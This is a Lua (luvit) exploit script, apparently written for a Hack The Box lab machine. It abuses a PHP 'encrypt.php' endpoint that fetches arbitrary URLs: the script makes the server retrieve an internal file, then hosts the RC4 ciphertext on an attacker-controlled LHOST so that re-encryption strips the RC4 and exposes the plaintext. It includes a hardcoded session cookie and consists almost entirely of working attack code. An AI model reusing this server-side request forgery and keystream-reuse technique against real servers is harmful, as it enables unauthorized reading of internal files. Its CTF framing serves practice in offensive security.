print("Script made by Xh4H")

local PHPSESSID = "h1858q2bfo87l4gl9ie7qic7hv"
if PHPSESSID == "" then return print("Please fill PHPSESSID variable. (script line 3)") end

local http = require("coro-http")
local base64 = require("base64")
local qrystring = require("querystring.lua")

if not args[2] then return print("No destination found.\n./luvit rc4.lua http://file_to_request.htb/file 10.10.14.12:80") end
if not args[3] then return print("No LHOST[:HPORT] found.\n./luvit rc4.lua http://file_to_request.htb/file 10.10.14.12:80") end


local file_to_request = args[2]
p("Loading attack against " .. file_to_request)

local function start_request2() -- Send back the encrypted output to receive initial content decrypted
	local res, body = http.request("GET", "http://10.10.10.129/encrypt.php?cipher=RC4&url=" .. qrystring.urlencode("http://" .. args[3] .. "/rc4_encrypted_temp.txt"), {
		{"Cookie", "PHPSESSID=" .. PHPSESSID}
	})

	if res.code == 200 then
		local final_base = body:match("output\"%>([%w=+/]+)")
		local final_base_decoded = base64.decode(final_base)
		print("Request sent.")
		print("Final base64 found: \nDECODED -> " .. final_base_decoded)
		print("Writing decoded output to rc4_decrypted.html")
		
		os.remove("./rc4_encrypted_temp.txt")
		local file = io.open("rc4_decrypted.html", "w")

		file:write(final_base_decoded)
		file:flush()
		file:close()

		print("Content written successfully")
	end
end

local function start_request1() -- GET initial content
	local res, body = http.request("GET", "http://10.10.10.129/encrypt.php?cipher=RC4&url=" .. qrystring.urlencode(file_to_request), {
		{"Cookie", "PHPSESSID=" .. PHPSESSID}
	})

	if res.code == 200 then
		local initial_base = body:match("output\"%>([%w=+/]+)")
		local initial_base_decoded = base64.decode(initial_base)

		print("Request sent.")
		print("Initial base64 found")
		print("Writing decoded output to rc4_encrypted_temp.txt")

		local file = io.open("rc4_encrypted_temp.txt", "w")

		file:write(initial_base_decoded)
		file:flush()
		file:close()

		print("Content written successfully")
		p("Starting second request.")

		start_request2()
	end
end

p("Starting request to http://10.10.10.129/encrypt.php?cipher=RC4&url=" .. file_to_request)
coroutine.wrap(function()
	start_request1()
end)()
